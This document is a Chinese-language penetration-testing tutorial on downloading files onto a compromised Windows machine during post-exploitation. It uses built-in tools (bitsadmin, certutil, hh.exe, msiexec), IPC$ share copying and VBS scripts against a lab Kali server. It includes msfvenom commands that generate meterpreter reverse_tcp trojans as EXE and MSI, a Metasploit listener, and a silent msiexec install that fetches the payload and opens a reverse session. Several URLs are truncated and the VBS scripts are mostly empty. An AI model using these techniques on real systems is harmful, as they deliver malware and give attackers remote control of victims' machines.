## 0x00 windows文件下载引文

*   不知道你们在进行渗透时会不会遇到这样的问题，在进行后渗透时linux系统是可以使用wget命令进行文件下载的，在真实的渗透环境下往往拿到的都只是windows系统的一个命令行，那windows系统怎么做到文件下载呢，笔者在这里给大家一一介绍

## 0x01 环境准备

首先需要搭建一个http服务，笔者这里使用的是kali linux进行搭建，IP地址192.168.109.128 首先启动apache`service apache2 restart`然后在/var/www/html/test目录随便写入一个文件![](../Images/d85d7ae54e7388d8cec00e45d119c1eb.png)准备工作就到此位置，接下来介绍几种windows系统下载文件的方式

## 0x02 Bitsadmin

该命令只能下载文件到本地磁盘上 使用方法 第一种：

```
bitsadmin /transfer myjob1 /download /priority normal http://192.168.109.128/
```

![](../Images/2fd1c7dab90e21cc88af65ba81674546.png)第二种：

```
bitsadmin /rawreturn /transfer getfile http://192.168.109.128/
```

![](../Images/e4b29eb1d59abe05dbaa153037d20e69.png)第三种：

```
bitsadmin /rawreturn /transfer getpayload http://192.168.109.128/
```

![](../Images/420d083b7107b0c0c1b6f5f2c3db6393.png)支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

## 0x03 Certutil

Windows程序用于处理证书 使用方法：

```
certutil.exe -urlcache -split -f http://192.168.109.128/
```

该命令会将文件下载到当前目录![](../Images/d63b19beea25dc6d7260d988267937e8.png)支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

## 0x04 HH.exe

介绍：用于处理cmh文件格式的应用程序 使用方法：

```
hh.exe http://192.168.109.128/
```

![](../Images/86ca5ef9c148e2a11d1acef877ec9e79.png)这里可以看到，下载的文件是以html的方式进行打开，但是如果是应用程序的话发现就可以做到下载的效果 可以先用msfvenom在网站目录下面生成一个exe后缀的木马

```

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.109.128 lport=4444 -f exe -o test.exe
```

![](../Images/8962bbd1baf6d89e7dee90fe5b3cb7cf.png)然后在windows这边再次使用hh.exe进行下载

```
hh.exe http://192.168.109.128/
```

![](../Images/c7f73ed396ec9f27c01d840fbd6c4110.png)可以看到是能进行下载的 支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

## 0x05 Msiexec.exe

系统进程，用于安装MSI，一般更新或者安装软件时会碰到，支持远程下载功能 使用方法：先使用kali linux的msfvenom模块在网站目录下面生成一个msi后缀的木马

```

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.109.128 lport=8888 -f msi -o test.msi
```

![](../Images/002caf09db90f44e6af25516c38b9358.png)然后进入msfconsole开启监听

```

use exploit/multi/handler
```

![](../Images/c3f91af1dc628a5e82d2d2ffe2ba16bd.png)然后在windows的命令行上输入

```
msiexec.exe /q /i http://192.168.109.128/
```

![](../Images/7aae4dc3f1343ab7216ba38b1fc5c7cf.png)因为msiexec.exe具有下载的特性，所以可以看到kali linux是能够接收到反弹的会话的![](../Images/b48a337bed0eb7f2c7e1f864fe2f7e19.png)支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

## 0x06 IPC$

Windows让进程间通信的开放的命名管道 这里需要两台windows进行实验，因为`IPC$`是基于windows才有的协议 windows管理员权限打开cmd，输入`net share ipc$`开启IPC$通道![](../Images/931997459b65304bdfa669c8d8a1a1a9.png)建立通道

```
net use \\192.168.109.186\ipc$ /user:administrator 
```

![](../Images/d0b9dd8db7f91a46709f637888acf5f6.png)

```

copy \\192.168.109.186\C$\Users\Administrator\Desktop\1.txt C:\Users\baji\Desktop
```

![](../Images/5031e2b7b7f0817e9fa28c67a5b778b9.png)即可复制文件成功 支持的系统版本：NT、Windows 2000、Windows XP及以上

## 0x07 VBS脚本

通过脚本也可以实现远程下载 使用方法 第一种：编写脚本文件1.vbs

```



























url = "http://192.168.109.128/test/test.txt"    '网络上的文件地址
```

在windows命令输入`cscript 1.vbs`即可![](../Images/0752610da710552a3a60fa72626762d0.png)第二种：编写脚本文件2.vbs

```

















Set xPost = createObject("Microsoft.XMLHTTP")
```

windows命令行输入`cscript 2.vbs`即可![](../Images/47e5cb4523ae49d0c2b28a71409695ba.png)
